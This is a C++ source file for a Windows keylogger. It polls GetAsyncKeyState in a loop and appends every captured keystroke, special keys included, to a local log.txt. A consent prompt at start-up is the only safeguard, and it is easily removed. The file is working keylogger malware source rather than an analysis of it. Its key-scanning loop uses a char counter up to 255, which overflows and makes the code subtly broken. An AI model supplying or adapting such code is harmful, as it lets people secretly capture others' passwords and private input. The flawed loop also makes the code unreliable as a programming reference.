#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

void LogKeystroke(int key_stroke, const char *file) {
    ofstream out_file(file, ios_base::app);

    if (key_stroke == VK_BACK)
        out_file << "[BACKSPACE]";
    else if (key_stroke == VK_RETURN)
        out_file << "\n";
    else if (key_stroke == VK_SPACE)
        out_file << " ";
    else if (key_stroke == VK_TAB)
        out_file << "[TAB]";
    else if (key_stroke == VK_SHIFT)
        out_file << "[SHIFT]";
    else if (key_stroke == VK_CONTROL)
        out_file << "[CONTROL]";
    else if (key_stroke == VK_ESCAPE)
        out_file << "[ESCAPE]";
    else if (key_stroke >= 65 && key_stroke <= 90) {
        if (GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x0001)) {
            out_file << char(key_stroke); 
        } else {
            out_file << char(key_stroke + 32); 
        }
    } else if (key_stroke >= 48 && key_stroke <= 57) {
        out_file << char(key_stroke);
    } else {
        out_file << "[KEY:" << key_stroke << "]"; 
    }

    out_file.close();
}

int main() {

    cout << "This program will start logging your keystrokes.\n";
    cout << "Press 'Y' to continue or any other key to exit: ";
    
    char response;
    cin >> response;

    if (response != 'Y' && response != 'y') {
        cout << "Exiting program.\n";
        return 0;
    }

    cout << "Keylogging started. Press 'Ctrl + C' to stop.\n";

    char i;
    while (true) {
        
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                LogKeystroke(i, "log.txt");
            }
        }
        Sleep(10); 
    }

    return 0;
}

